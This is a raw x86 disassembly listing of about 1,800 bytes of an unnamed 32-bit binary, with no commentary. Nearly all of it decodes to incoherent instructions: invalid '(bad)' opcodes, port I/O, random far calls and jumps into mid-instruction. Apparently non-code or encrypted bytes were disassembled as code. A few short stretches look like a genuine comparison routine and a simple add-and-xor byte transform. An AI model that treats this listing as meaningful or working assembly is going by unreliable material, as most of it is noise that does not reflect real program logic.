  40ac6a:	sbb    ebx,DWORD PTR [ebp-0x2270aef5]
  40ac70:	nop
  40ac71:	jmp    0xacbd:0x692bef3d
  40ac78:	cmp    bh,dl
  40ac7a:	jae    0x40acf6
  40ac7c:	cmp    DWORD PTR [esi],0x5b979031
  40ac82:	xor    ebp,DWORD PTR [edi+0x2e]
  40ac85:	jne    0x40ac62
  40ac87:	jno    0x40ac87
  40ac89:	les    eax,FWORD PTR [ebx-0x79]
  40ac8c:	fnstenv [edi-0x6c]
  40ac8f:	cmp    ah,bh
  40ac91:	int3   
  40ac92:	popa   
  40ac93:	mov    ebx,0x85c6bb23
  40ac98:	mov    ebp,0xb1ad267e
  40ac9d:	cmp    edi,DWORD PTR [ecx+0x1a]
  40aca0:	pop    eax
  40aca1:	sub    ebx,DWORD PTR [ecx-0xa]
  40aca4:	jno    0x40ac8d
  40aca6:	cmp    al,0x88
  40aca8:	inc    ebx
  40aca9:	dec    ebp
  40acaa:	jmp    0x70cd5fa6
  40acaf:	mov    ecx,0x6c5d250e
  40acb4:	and    DWORD PTR [edi+0x6a],edi
  40acb7:	push   eax
  40acb8:	les    esi,FWORD PTR [ebx-0x59]
  40acbb:	ins    DWORD PTR es:[edi],dx
  40acbc:	cmp    BYTE PTR [ebx],ah
  40acbe:	leave  
  40acbf:	vpsrad ymm6,ymm3,xmm2
  40acc4:	sub    esi,DWORD PTR [eax-0x5b92fdc4]
  40acca:	scas   al,BYTE PTR es:[edi]
  40accb:	cmp    al,0xca
  40accd:	clc    
  40acce:	pop    ebx
  40accf:	mov    cs,WORD PTR [edi+0x77]
  40acd2:	int    0x4d
  40acd4:	aad    0xb1
  40acd6:	jo     0x40ac5d
  40acd8:	aas    
  40acd9:	fsub   st(6),st
  40acdb:	ret    
  40acdc:	push   ebp
  40acdd:	clc    
  40acde:	xor    eax,0xcd5fa24f
  40ace3:	out    dx,al
  40ace4:	sub    DWORD PTR [ebx],0xfbc9b659
  40acea:	int    0xce
  40acec:	rcl    DWORD PTR [ebx+0x6bf35c49],cl
  40acf2:	out    dx,eax
  40acf3:	adc    ebx,DWORD PTR [eax+edi*2]
  40acf6:	inc    eax
  40acf7:	push   ebp
  40acf8:	in     eax,dx
  40acf9:	daa    
  40acfa:	std    
  40acfb:	out    0x87,al
  40acfd:	cmp    ch,BYTE PTR [esi+0x5f7ee73e]
  40ad03:	cdq    
  40ad04:	dec    ecx
  40ad05:	jl     0x40ad14
  40ad07:	stc    
  40ad08:	push   ss
  40ad09:	dec    eax
  40ad0a:	xchg   edx,eax
  40ad0b:	adc    ah,al
  40ad0d:	fisubr DWORD PTR [ebx]
  40ad0f:	or     BYTE PTR [ecx],al
  40ad11:	mov    DWORD PTR [edx+0x3e3bd342],esp
  40ad17:	pop    es
  40ad18:	lock pop esp
  40ad1a:	adc    al,0x70
  40ad1c:	popa   
  40ad1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad1e:	push   ecx
  40ad1f:	retf   
  40ad20:	pop    ecx
  40ad21:	and    al,0xb1
  40ad23:	xchg   edi,eax
  40ad24:	jge    0x40ad65
  40ad26:	cmp    ah,BYTE PTR [ecx]
  40ad28:	dec    edi
  40ad29:	jae    0x40ada5
  40ad2b:	loope  0x40ada1
  40ad2d:	push   ds
  40ad2e:	pusha  
  40ad2f:	mul    DWORD PTR [ebp-0x54]
  40ad32:	in     eax,0xea
  40ad34:	mov    dh,0xf5
  40ad36:	outs   dx,BYTE PTR ds:[esi]
  40ad37:	retf   0x301
  40ad3a:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40ad41:	add    al,0x8
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x7a723cc7]
  40ad81:	inc    DWORD PTR [eax]
  40ad83:	repz jle 0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	rcl    DWORD PTR [edx+eiz*4],cl
  40ad8d:	(bad)  
  40ad8e:	fcomp  DWORD PTR [eax]
  40ad90:	neg    BYTE PTR [ebp+0x54f15436]
  40ad96:	fdiv   DWORD PTR fs:[eax-0x6b]
  40ad9a:	in     eax,dx
  40ad9b:	ret    0xe97d
  40ad9e:	mov    gs,ebp
  40ada0:	sub    DWORD PTR [edi],ebx
  40ada2:	aam    0x14
  40ada4:	jns    0x40ad97
  40ada6:	sbb    ch,BYTE PTR [ebx-0x1b0f92cc]
  40adac:	mov    ebx,0x15dff395
  40adb1:	scas   al,BYTE PTR es:[edi]
  40adb2:	jo     0x40add9
  40adb4:	push   cs
  40adb5:	out    dx,al
  40adb6:	mov    cl,0x38
  40adb8:	jecxz  0x40adb1
  40adba:	repnz fisubr WORD PTR [ebx]
  40adbd:	and    DWORD PTR gs:[edx-0x55a1c59a],edx
  40adc4:	mov    edx,0x5ae34ff9
  40adc9:	cmp    eax,0xefb5a446
  40adce:	push   eax
  40adcf:	inc    eax
  40add0:	mov    BYTE PTR [edx+0x42],ch
  40add3:	ds cli 
  40add5:	cmp    BYTE PTR [ecx+0x7],bl
  40add8:	mov    edi,0xd92d77af
  40addd:	mov    edi,0x86551acc
  40ade2:	cmp    BYTE PTR [ebx],dl
  40ade4:	aad    0xe4
  40ade6:	out    dx,al
  40ade7:	pop    ebp
  40ade8:	dec    esi
  40ade9:	and    ebx,DWORD PTR [eax-0x54]
  40adec:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adee:	push   0xffffffa0
  40adf0:	shl    DWORD PTR [eax-0x6a],1
  40adf3:	int    0x93
  40adf5:	pop    ecx
  40adf6:	addr16 gs cmp eax,0x629ee9f
  40adfd:	jmp    0xec0489dd
  40ae02:	sub    al,0x1e
  40ae04:	repnz push eax
  40ae06:	push   edx
  40ae07:	cld    
  40ae08:	rcl    DWORD PTR [ebx-0x53],0x5e
  40ae0c:	ins    BYTE PTR es:[edi],dx
  40ae0d:	or     ebx,DWORD PTR [ecx+0xb5b2f7e]
  40ae13:	je     0x40adeb
  40ae15:	outs   dx,BYTE PTR ds:[esi]
  40ae16:	(bad)  
  40ae17:	push   ecx
  40ae18:	aas    
  40ae19:	dec    ecx
  40ae1a:	div    ebx
  40ae1c:	lahf   
  40ae1d:	push   esi
  40ae1e:	lahf   
  40ae1f:	xor    dh,BYTE PTR [edx+edx*1+0x66]
  40ae23:	sub    cl,BYTE PTR [ecx*1+0xd288f3a]
  40ae2a:	mov    al,ds:0xa27bf2df
  40ae2f:	xchg   edi,eax
  40ae30:	fistp  QWORD PTR [esi-0x7]
  40ae33:	mov    BYTE PTR [eax+0x5c0409d0],cl
  40ae39:	outs   dx,DWORD PTR ds:[esi]
  40ae3a:	leave  
  40ae3b:	stos   DWORD PTR es:[edi],eax
  40ae3c:	leave  
  40ae3d:	cmp    edi,DWORD PTR [eax]
  40ae3f:	cwde   
  40ae40:	push   eax
  40ae41:	in     eax,dx
  40ae42:	sbb    eax,0xe694e639
  40ae47:	fisubr WORD PTR [edi]
  40ae49:	jl     0x40ae41
  40ae4b:	sub    ebp,DWORD PTR [edi-0x73]
  40ae4e:	aas    
  40ae4f:	pop    ecx
  40ae50:	mov    cl,0x9b
  40ae52:	mov    edi,0x29f2c7d5
  40ae57:	jbe    0x40ae22
  40ae59:	cli    
  40ae5a:	sub    bh,BYTE PTR [eax-0x79]
  40ae5d:	sbb    ecx,DWORD PTR [ebp+0x768c8539]
  40ae63:	or     dh,BYTE PTR [eax+0x71]
  40ae66:	popf   
  40ae67:	test   eax,0x55518f81
  40ae6c:	sbb    al,BYTE PTR [eax+0x7a4960a8]
  40ae72:	jns    0x40ae85
  40ae74:	inc    edi
  40ae75:	pop    eax
  40ae76:	popf   
  40ae77:	mov    ebp,0x48e1e44a
  40ae7c:	adc    al,BYTE PTR [ebx-0x18]
  40ae7f:	repz shr DWORD PTR [ebx+0x7b],0x7a
  40ae84:	and    esi,DWORD PTR [ebp+0x126b8a3c]
  40ae8a:	leave  
  40ae8b:	and    al,0xe5
  40ae8d:	icebp  
  40ae8e:	pushf  
  40ae8f:	popf   
  40ae90:	pop    esp
  40ae91:	dec    eax
  40ae92:	(bad)  
  40ae93:	pop    esp
  40ae94:	pushf  
  40ae95:	bound  eax,QWORD PTR ds:0x438d88f0
  40ae9b:	dec    edx
  40ae9c:	popa   
  40ae9d:	inc    edi
  40ae9e:	and    ecx,0xa40f270c
  40aea4:	xchg   ecx,eax
  40aea5:	sbb    DWORD PTR [ecx+0x164146d],0x64
  40aeac:	and    al,0xed
  40aeae:	jmp    0x40af04
  40aeb0:	sbb    eax,0x26254da6
  40aeb5:	xchg   edi,eax
  40aeb6:	jle    0x40aeed
  40aeb8:	mov    ah,al
  40aeba:	mov    edx,DWORD PTR [ebp-0x35]
  40aebd:	stos   DWORD PTR es:[edi],eax
  40aebe:	push   ebp
  40aebf:	sahf   
  40aec0:	(bad)  
  40aec1:	mov    DWORD PTR [esi-0x6c],ebp
  40aec4:	ins    BYTE PTR es:[edi],dx
  40aec5:	sbb    al,0x33
  40aec7:	sbb    dl,BYTE PTR [edx]
  40aec9:	mov    edi,DWORD PTR [edi]
  40aecb:	mov    ebp,0x7d2a2556
  40aed0:	push   eax
  40aed1:	in     eax,0x2
  40aed3:	outs   dx,BYTE PTR ds:[esi]
  40aed4:	iret   
  40aed5:	data16 (bad) 
  40aed7:	jb     0x40aea2
  40aed9:	(bad)  [edi+0x6df9c2de]
  40aedf:	and    BYTE PTR [edi],bl
  40aee1:	call   0x540afeef
  40aee6:	outs   dx,DWORD PTR ds:[esi]
  40aee7:	xchg   ebx,eax
  40aee8:	stc    
  40aee9:	mov    al,0x11
  40aeeb:	adc    al,0x8a
  40aeed:	mov    bh,0x3d
  40aeef:	cmp    al,0xf0
  40aef1:	mov    ds:0x329c482c,eax
  40aef6:	daa    
  40aef7:	sti    
  40aef8:	(bad)  
  40aef9:	sbb    ebx,DWORD PTR [ebp-0x7b02fdf3]
  40aeff:	pop    esi
  40af00:	loop   0x40af56
  40af02:	test   eax,0x40e0984f
  40af07:	outs   dx,DWORD PTR ds:[esi]
  40af08:	jle    0x40aeb5
  40af0a:	mov    bh,0xa1
  40af0c:	(bad)  
  40af0d:	inc    edx
  40af0e:	arpl   dx,bp
  40af10:	xor    edi,DWORD PTR [esi]
  40af12:	jmp    0x40af13
  40af14:	sub    ch,0xb7
  40af17:	cmp    bl,BYTE PTR [edx+0x47]
  40af1a:	lods   al,BYTE PTR ds:[esi]
  40af1b:	xchg   edi,eax
  40af1c:	mov    ebp,0x8d5cb328
  40af21:	lds    ebx,FWORD PTR [edi+ebp*8]
  40af24:	dec    ebp
  40af25:	sbb    al,0xc3
  40af27:	push   ss
  40af28:	not    DWORD PTR [ebx+0x2c]
  40af2b:	mov    edx,ecx
  40af2d:	pushf  
  40af2e:	fidivr WORD PTR [ebp+0x76]
  40af31:	les    ebp,FWORD PTR [edi-0x4d]
  40af34:	out    dx,eax
  40af35:	in     al,dx
  40af36:	ror    BYTE PTR [edi+0x57],cl
  40af39:	xchg   esi,eax
  40af3a:	loopne 0x40af4a
  40af3c:	call   0x638d:0xcda0c199
  40af43:	inc    eax
  40af44:	cdq    
  40af45:	sbb    edi,ebp
  40af47:	aad    0x13
  40af49:	lock inc edi
  40af4b:	dec    esp
  40af4c:	fsub   QWORD PTR [eax+eiz*2+0x2251028e]
  40af53:	and    DWORD PTR [ecx],ebp
  40af55:	outs   dx,BYTE PTR ds:[esi]
  40af56:	push   ecx
  40af57:	js     0x40afa2
  40af59:	mov    ch,0xf2
  40af5b:	xchg   esi,eax
  40af5c:	jo     0x40af5f
  40af5e:	cdq    
  40af5f:	mov    eax,0x8ee55a14
  40af64:	mov    bl,0x95
  40af66:	add    ebx,esi
  40af68:	xor    esi,DWORD PTR [eax]
  40af6a:	mov    ebp,0x9e480206
  40af6f:	retf   
  40af70:	pop    es
  40af71:	fdivr  QWORD PTR [esi+0x2504fe8d]
  40af77:	push   ss
  40af78:	mov    bh,al
  40af7a:	popa   
  40af7b:	sbb    eax,DWORD PTR [ecx-0x6fc08edd]
  40af81:	popa   
  40af82:	jg     0x40aff5
  40af84:	or     dh,BYTE PTR [edi]
  40af86:	sti    
  40af87:	adc    al,0x90
  40af89:	loop   0x40af9c
  40af8b:	in     al,0x7b
  40af8d:	dec    esi
  40af8e:	out    dx,al
  40af8f:	jno    0x40af2d
  40af91:	fwait
  40af92:	(bad)  
  40af93:	mov    BYTE PTR [eax+0x3bb7c182],dl
  40af99:	pop    esi
  40af9a:	leave  
  40af9b:	push   ebx
  40af9c:	nop
  40af9d:	cwde   
  40af9e:	ss loope 0x40af46
  40afa1:	adc    al,0xaa
  40afa3:	or     ecx,DWORD PTR [ebx]
  40afa5:	neg    BYTE PTR [edx+0x56]
  40afa8:	retf   
  40afa9:	pusha  
  40afaa:	test   eax,0xa83b4f1d
  40afaf:	leave  
  40afb0:	ret    0xe4a3
  40afb3:	imul   edx,DWORD PTR [edi-0x3105de0d],0x5
  40afba:	nop
  40afbb:	cli    
  40afbc:	ficom  DWORD PTR [ebp+0x4c]
  40afbf:	mov    eax,ds:0xba9ecfb4
  40afc4:	jg     0x40afd8
  40afc6:	add    eax,0xfa590c79
  40afcb:	les    ecx,FWORD PTR [ebp+edx*8-0x3a87a933]
  40afd2:	int    0x3e
  40afd4:	outs   dx,DWORD PTR ds:[esi]
  40afd5:	fldenv [ecx-0x60]
  40afd8:	or     al,0x52
  40afda:	enter  0x9c81,0xca
  40afde:	dec    ecx
  40afdf:	cmp    esi,edi
  40afe1:	out    dx,al
  40afe2:	dec    ebx
  40afe3:	pop    es
  40afe4:	mov    ebx,0x5da6c809
  40afe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afea:	call   0xcc7b:0xfe146ba1
  40aff1:	pop    edi
  40aff2:	sub    eax,0x199a328e
  40aff7:	cdq    
  40aff8:	pop    esi
  40aff9:	pop    edx
  40affa:	arpl   WORD PTR [edi-0xb],dx
  40affd:	out    dx,eax
  40affe:	idiv   DWORD PTR [esi-0x36]
  40b001:	lock xor al,0x5a
  40b004:	popa   
  40b005:	bound  esp,QWORD PTR [ebx-0x67]
  40b008:	push   esi
  40b009:	jnp    0x40b06e
  40b00b:	imul   eax,DWORD PTR [esi],0x247734ff
  40b011:	ja     0x40b064
  40b013:	(bad)  [ebp+0x3e]
  40b016:	pop    edx
  40b017:	push   eax
  40b018:	jle    0x40b051
  40b01a:	sti    
  40b01b:	stc    
  40b01c:	adc    esp,DWORD PTR [ecx]
  40b01e:	inc    ebx
  40b01f:	and    BYTE PTR ss:[ecx-0x3c],bl
  40b023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b024:	(bad)  
  40b025:	shr    ebp,cl
  40b027:	jno    0x40b058
  40b029:	in     al,dx
  40b02a:	pop    es
  40b02b:	pushf  
  40b02c:	loope  0x40afda
  40b02e:	and    edx,DWORD PTR [ebx]
  40b030:	test   DWORD PTR [edi+0x1146881d],0x3b6eb6cb
  40b03a:	shl    DWORD PTR [edi],cl
  40b03c:	cmp    esi,DWORD PTR [ebp+0x53]
  40b03f:	(bad)  
  40b041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b042:	gs popf 
  40b044:	sub    eax,0x41ab091d
  40b049:	shr    BYTE PTR [ebp+0x1aeb7257],1
  40b04f:	or     edi,ebp
  40b051:	xor    DWORD PTR [edi],ecx
  40b053:	dec    edi
  40b054:	adc    DWORD PTR [ebx],ebp
  40b056:	(bad)  
  40b057:	xchg   ecx,eax
  40b058:	lock jno 0x40b091
  40b05b:	test   dh,0x8c
  40b05e:	push   edx
  40b05f:	adc    ch,BYTE PTR [edx+edi*4-0x6101368b]
  40b066:	scas   al,BYTE PTR es:[edi]
  40b067:	cmc    
  40b068:	pop    edx
  40b069:	test   eax,0xae9cb2d7
  40b06e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b06f:	out    0x33,al
  40b071:	(bad)  
  40b072:	push   esp
  40b073:	shr    bh,0x85
  40b076:	std    
  40b077:	sub    ah,BYTE PTR [edi-0x50]
  40b07a:	sbb    BYTE PTR [edi+esi*4],bh
  40b07d:	dec    edi
  40b07e:	mov    WORD PTR [esi-0x4d],es
  40b081:	cld    
  40b082:	cmp    al,0xcc
  40b084:	cmp    al,0x43
  40b086:	loope  0x40b029
  40b088:	loope  0x40b075
  40b08a:	out    0x27,eax
  40b08c:	sub    BYTE PTR [ebx+ecx*4+0x4d8be045],0xf8
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	or     ecx,DWORD PTR [ebx-0x1f3264d]
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	fcomp  QWORD PTR [ebx-0x27e76aeb]
  40b0cb:	cmp    dh,BYTE PTR [edi]
  40b0cd:	xchg   ebx,eax
  40b0ce:	ror    DWORD PTR [ebx+0x54b9c8b8],0x20
  40b0d5:	mov    dh,0x58
  40b0d7:	xchg   edx,eax
  40b0d8:	fsubp  st(2),st
  40b0da:	jae    0x40b14b
  40b0dc:	pop    ebx
  40b0dd:	inc    eax
  40b0de:	in     al,dx
  40b0df:	mov    ch,0x49
  40b0e1:	xchg   esi,edx
  40b0e3:	pop    ss
  40b0e4:	jo     0x40b0db
  40b0e6:	shl    BYTE PTR [esi-0x79],1
  40b0e9:	xchg   esi,eax
  40b0ea:	clc    
  40b0eb:	leave  
  40b0ec:	pop    ebp
  40b0ed:	pop    ebx
  40b0ee:	sbb    al,0xd7
  40b0f0:	mov    ecx,0xd1bd951f
  40b0f5:	fbstp  TBYTE PTR [esi-0x20543ff6]
  40b0fb:	ins    BYTE PTR es:[edi],dx
  40b0fc:	into   
  40b0fd:	sub    eax,0x87b06b95
  40b102:	ss pop esi
  40b104:	jb     0x40b11d
  40b106:	fldcw  WORD PTR [eax+ecx*2+0x765dd87f]
  40b10d:	push   esi
  40b10e:	outs   dx,DWORD PTR ds:[esi]
  40b10f:	iret   
  40b110:	mov    dl,0xc3
  40b112:	and    DWORD PTR [esi-0x2e5eb5f1],ecx
  40b118:	jae    0x40b131
  40b11a:	fcomp  QWORD PTR [edx]
  40b11c:	adc    eax,0x93668808
  40b121:	mov    cl,0x9c
  40b123:	outs   dx,DWORD PTR ds:[esi]
  40b124:	scas   al,BYTE PTR es:[edi]
  40b125:	daa    
  40b126:	and    esi,DWORD PTR [ecx+0x59070d29]
  40b12c:	and    BYTE PTR [ebx-0x18d412d3],bh
  40b132:	cmp    edx,DWORD PTR [esi+0x4e9c2e6f]
  40b138:	test   al,0x50
  40b13a:	(bad)  
  40b13b:	imul   esp,DWORD PTR [edx-0x17],0xddb1cf98
  40b142:	push   es
  40b143:	jle    0x40b1bf
  40b145:	mov    ecx,0x943cde22
  40b14a:	out    dx,al
  40b14b:	add    BYTE PTR [edi+0x6a],dh
  40b14e:	dec    edi
  40b14f:	cmp    eax,0xad75340
  40b154:	in     eax,0x25
  40b156:	add    BYTE PTR [ebx],cl
  40b158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b159:	jp     0x40b0e6
  40b15b:	enter  0x7ad,0xbf
  40b15f:	scas   al,BYTE PTR es:[edi]
  40b160:	add    cl,ah
  40b162:	push   ss
  40b163:	ins    BYTE PTR es:[edi],dx
  40b164:	retf   0x828
  40b167:	sub    DWORD PTR [eax-0x1c],ebx
  40b16a:	xor    cl,0x72
  40b16d:	and    DWORD PTR [esi+0x1120d4ad],0x7f73f2bb
  40b177:	lods   eax,DWORD PTR ds:[esi]
  40b178:	repz popfw 
  40b17b:	xchg   ecx,eax
  40b17c:	pop    ebx
  40b17d:	jmp    0x40b1a8
  40b17f:	jecxz  0x40b1d9
  40b181:	test   DWORD PTR [ebp+0x45a0cf98],edx
  40b187:	loop   0x40b11d
  40b189:	push   esi
  40b18a:	out    0x6f,eax
  40b18c:	popf   
  40b18d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b18e:	call   0x5c54:0x6153c84d
  40b195:	push   ebx
  40b196:	dec    ebp
  40b197:	fwait
  40b198:	ja     0x40b1a4
  40b19a:	mov    dh,0xaa
  40b19c:	imul   esi,DWORD PTR [ebp-0x1915a5e2],0x46eb58b1
  40b1a6:	or     DWORD PTR [esp+ebx*4+0x18],0xbcb90083
  40b1ae:	out    dx,al
  40b1af:	ja     0x40b1a3
  40b1b1:	pop    es
  40b1b2:	xchg   esi,eax
  40b1b3:	sub    BYTE PTR [ecx+0x612d21ed],bl
  40b1b9:	cs inc edx
  40b1bb:	sub    DWORD PTR [edx+0x7cf0e043],0x3c5e7bc7
  40b1c5:	rcl    ebp,1
  40b1c7:	cmp    dl,BYTE PTR [esi]
  40b1c9:	imul   BYTE PTR [esi-0x44]
  40b1cc:	ret    0xc51c
  40b1cf:	sub    eax,DWORD PTR [ebx]
  40b1d1:	out    0x63,al
  40b1d3:	stos   DWORD PTR es:[edi],eax
  40b1d4:	iret   
  40b1d5:	das    
  40b1d6:	jno    0x40b1c9
  40b1d8:	retf   
  40b1d9:	(bad)  
  40b1da:	or     edx,DWORD PTR [ebx]
  40b1dc:	mov    dh,0x6b
  40b1de:	dec    esi
  40b1df:	mov    cl,0xf2
  40b1e1:	sar    ecx,cl
  40b1e3:	pusha  
  40b1e4:	push   ebp
  40b1e5:	test   eax,0x347a6317
  40b1ea:	imul   esi,DWORD PTR [edx+edi*2],0xffffff88
  40b1ee:	int3   
  40b1ef:	pop    ebx
  40b1f0:	lea    ebp,[eax+eax*2]
  40b1f3:	mov    DWORD PTR [edx],edx
  40b1f5:	mov    ecx,0xd8535288
  40b1fa:	and    eax,0x251362d
  40b1ff:	jl     0x40b1bc
  40b201:	sub    DWORD PTR [edi],edx
  40b203:	lods   al,BYTE PTR ds:[esi]
  40b204:	jbe    0x40b243
  40b206:	and    BYTE PTR [edx*4+0x7ec209a3],dl
  40b20d:	xchg   esp,eax
  40b20e:	and    BYTE PTR [ecx+0x3c],0x38
  40b212:	push   eax
  40b213:	xchg   esi,eax
  40b214:	fisttp QWORD PTR [edx]
  40b216:	dec    esi
  40b217:	push   es
  40b218:	push   esp
  40b219:	repz pop ecx
  40b21b:	xchg   edx,eax
  40b21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b21d:	lods   eax,DWORD PTR ds:[esi]
  40b21e:	iret   
  40b21f:	sbb    BYTE PTR [esi-0x19],0xd8
  40b223:	jp     0x40b231
  40b225:	mov    ss,WORD PTR [edx+0x1d]
  40b228:	fcmovnbe st,st(1)
  40b22a:	push   ebx
  40b22b:	mov    ah,0xa2
  40b22d:	xor    DWORD PTR [eax],edi
  40b22f:	or     DWORD PTR [eax],0xffffffd6
  40b232:	jb     0x40b25a
  40b234:	sbb    esi,edx
  40b236:	mov    ch,0xd7
  40b238:	or     DWORD PTR [ebx+0x7379656e],esi
  40b23e:	inc    esp
  40b23f:	pop    esi
  40b240:	imul   edx,edx,0xf95a98fb
  40b246:	js     0x40b273
  40b248:	and    eax,0x8e9c5df
  40b24d:	mov    DWORD PTR [eax-0x46],esi
  40b250:	xchg   DWORD PTR ds:0xf3a96184,edx
  40b256:	into   
  40b257:	jb     0x40b287
  40b259:	xchg   esi,eax
  40b25a:	loope  0x40b2db
  40b25c:	add    bh,BYTE PTR [ebx-0x5c]
  40b25f:	push   esp
  40b260:	adc    ebp,DWORD PTR [eax]
  40b262:	mov    ds:0xb67d0e22,eax
  40b267:	dec    esi
  40b268:	or     ch,ah
  40b26a:	cmp    ecx,ebx
  40b26c:	or     eax,0xf66b1fb5
  40b271:	xor    eax,0x35430f8e
  40b276:	pop    ecx
  40b277:	sbb    BYTE PTR ds:0x59f0b68,cl
  40b27d:	add    eax,0x441e4673
  40b282:	sbb    eax,edx
  40b284:	test   BYTE PTR [ebp-0x69],dh
  40b287:	mov    bl,0xd4
  40b289:	jle    0x40b240
  40b28b:	icebp  
  40b28c:	int3   
  40b28d:	shl    BYTE PTR [esi],1
  40b28f:	sub    DWORD PTR [edx-0x27],eax
  40b292:	scas   al,BYTE PTR es:[edi]
  40b293:	jle    0x40b238
  40b295:	test   DWORD PTR [eax+ebp*1-0x95a0b8b],esp
  40b29c:	inc    eax
  40b29d:	call   0x69e2769
  40b2a2:	(bad)  
  40b2a3:	cld    
  40b2a4:	inc    esi
  40b2a5:	mov    ebp,0x1e276b6d
  40b2aa:	jle    0x40b23a
  40b2ac:	sub    al,0x19
  40b2ae:	sub    ch,BYTE PTR [ecx]
  40b2b0:	ret    0x8488
  40b2b3:	ret    0x3845
  40b2b6:	mov    al,0x94
  40b2b8:	aaa    
  40b2b9:	rol    BYTE PTR [edi-0x5be3c9d5],0xa1
  40b2c0:	push   ebp
  40b2c1:	(bad)  
  40b2c2:	lds    edx,FWORD PTR [ebp-0x5ee1b92d]
  40b2c8:	shl    DWORD PTR [ebx-0x76],1
  40b2cb:	adc    DWORD PTR [ecx],ecx
  40b2cd:	arpl   di,sp
  40b2cf:	mov    edi,0xcb022516
  40b2d4:	mov    eax,ds:0x88e03567
  40b2d9:	sbb    BYTE PTR [eax],0xf9
  40b2dc:	repnz mov esi,0x5edc4b8f
  40b2e2:	xchg   BYTE PTR [edx],bl
  40b2e4:	mov    dh,dl
  40b2e6:	push   edi
  40b2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e8:	lahf   
  40b2e9:	(bad)  
  40b2ea:	iret   
  40b2eb:	imul   edi,edx,0x7d
  40b2ee:	hlt    
  40b2ef:	mov    ds:0x797cbecc,al
  40b2f4:	sbb    ecx,esp
  40b2f6:	aad    0xb9
  40b2f8:	or     al,BYTE PTR [esi-0x6b198b08]
  40b2fe:	loop   0x40b292
  40b300:	imul   ecx,DWORD PTR [ecx+0x12191e22],0xffffffd5
  40b307:	sub    ecx,edi
  40b309:	bound  esp,QWORD PTR [edx-0x148e76d6]
  40b30f:	pop    esi
  40b310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b311:	push   eax
  40b312:	adc    cl,cl
  40b314:	xor    bh,BYTE PTR [ebx+0x37c36ad4]
  40b31a:	mov    al,0x15
  40b31c:	push   eax
  40b31d:	arpl   WORD PTR [ebx],bp
  40b31f:	aas    
  40b320:	mov    bh,BYTE PTR [edi+0x44]
  40b323:	rcr    DWORD PTR [edi-0x4ba33986],1
  40b329:	xchg   edi,eax
  40b32a:	dec    ecx
  40b32b:	jne    0x40b2d5
  40b32d:	xchg   edx,eax
  40b32e:	pop    ebp
  40b32f:	es fsubp st(6),st
  40b332:	div    DWORD PTR [esi-0x51525f37]
  40b338:	push   edx
  40b339:	xor    BYTE PTR [ecx],cl
  40b33b:	lods   eax,DWORD PTR ds:[esi]
  40b33c:	adc    eax,0xacfb1539
  40b341:	add    al,0x0
  40b343:	fld    DWORD PTR [ebx+edx*2+0x2a]
  40b347:	mov    ds:0x7002110,eax
  40b34c:	nop
  40b34d:	pushw  ss
  40b34f:	out    0x67,al
  40b351:	fwait
  40b352:	jge    0x40b3ca
  40b354:	fcomip st,st(3)
  40b356:	dec    ebx
  40b357:	loop   0x40b327
  40b359:	rol    BYTE PTR [ebx-0x66ce3a4a],cl
  40b35f:	mov    eax,0x8f0dd4fa
  40b364:	into   
  40b365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b366:	xchg   DWORD PTR [eax-0x2d],ebx
  40b369:	adc    eax,0x5e778bbf
  40b36e:	out    0xf8,eax
  40b370:	xor    dl,BYTE PTR [ecx-0x5f932b3b]
  40b376:	sti    
  40b377:	lahf   
  40b378:	inc    ebx
  40b379:	loopne 0x40b3ec
  40b37b:	push   eax
  40b37c:	mov    ds:0xce7e3f89,eax
  40b381:	clc    
  40b382:	push   ebp
  40b383:	cwde   
  40b384:	jb     0x40b3aa
  40b386:	cmp    ecx,DWORD PTR [eax-0x1ac91aa2]
  40b38c:	test   BYTE PTR [esi],bl
  40b38e:	ret    
  40b38f:	cmp    dl,ah
  40b391:	addr16 test eax,0xcede224
  40b397:	mov    bl,0xbf
  40b399:	jp     0x40b3d0
  40b39b:	push   es
  40b39c:	or     bl,BYTE PTR [edx+0x1d]
  40b39f:	enter  0x2145,0x8b
